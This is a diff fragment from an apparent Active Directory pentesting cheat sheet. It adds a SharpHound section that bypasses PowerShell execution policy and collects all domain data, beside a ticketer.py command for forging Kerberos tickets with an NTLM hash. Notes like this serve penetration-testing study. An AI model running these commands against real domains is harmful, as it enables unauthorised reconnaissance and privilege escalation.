@@ -350,6 +350,13 @@ iwr -UseDefaultCredentials http://web04
 ticketer.py -spn SPN -domain-sid DOMAIN SID -nthash NTLM -dc-ip IP_VICTIM -domain domain Administrator
 ```
 
+## SharpHound.ps1
+```bash
+powershell -ep bypass
+. .\Sharphound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\TEMP\
+```
+
 
 ## Golden Tickets
 ```bash
